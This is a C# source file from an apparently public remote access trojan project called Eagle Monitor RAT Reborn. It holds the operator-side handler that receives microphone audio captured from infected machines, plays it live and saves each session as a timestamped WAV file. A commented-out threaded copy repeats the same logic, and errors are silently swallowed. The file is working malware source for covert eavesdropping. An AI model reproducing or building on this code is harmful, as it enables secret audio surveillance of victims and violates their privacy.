using Eagle_Monitor_RAT_Reborn.Network;
using NAudio.Wave;
using PacketLib.Packet;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_RAT_Reborn.PacketHandler
{
    internal class RemoteAudioCapturePacketHandler
    {
        public RemoteAudioCapturePacketHandler(RemoteAudioCapturePacket remoteAudioCapturePacket) : base()//, ClientHandler clientHandler)
        {
            try
            {

                if (ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.hasAlreadyConnected == false)
                {
                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.currentFileName = ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientPath + "\\Audio Records\\" + Misc.Utils.DateFormater() + ".wav";
                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.currentOffset = 0;
                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.waveFileWriter = new WaveFileWriter(ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.currentFileName, new WaveFormat(44100, 1));
                }
                //currentOffset
                ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.hasAlreadyConnected = true;

                ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.bufferedWaveProvider.AddSamples(remoteAudioCapturePacket.audioCapture, 0, remoteAudioCapturePacket.bytesRecorded);

                ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.waveFileWriter.Write(remoteAudioCapturePacket.audioCapture, 0, remoteAudioCapturePacket.bytesRecorded);

                ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.waveFileWriter.Flush();

                ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.currentOffset += remoteAudioCapturePacket.bytesRecorded;
            }
            catch { }
            return;
            /*new Thread(() => {
                try
                {

                    if (ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.hasAlreadyConnected == false)
                    {
                        ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.currentFileName = ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientPath + "\\Audio Records\\" + Misc.Utils.DateFormater() + ".wav";
                        ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.currentOffset = 0;
                        ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.waveFileWriter = new WaveFileWriter(ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.currentFileName, new WaveFormat(44100, 1));
                    }
                    //currentOffset
                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.hasAlreadyConnected = true;

                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.bufferedWaveProvider.AddSamples(remoteAudioCapturePacket.audioCapture, 0, remoteAudioCapturePacket.bytesRecorded);

                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.waveFileWriter.Write(remoteAudioCapturePacket.audioCapture, 0, remoteAudioCapturePacket.bytesRecorded);

                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.waveFileWriter.Flush();

                    ClientHandler.ClientHandlersList[remoteAudioCapturePacket.baseIp].clientForm.remoteMicrophoneHandler.currentOffset += remoteAudioCapturePacket.bytesRecorded;

                    return;
                }
                catch { }
            }).Start();*/
        }
    }
}
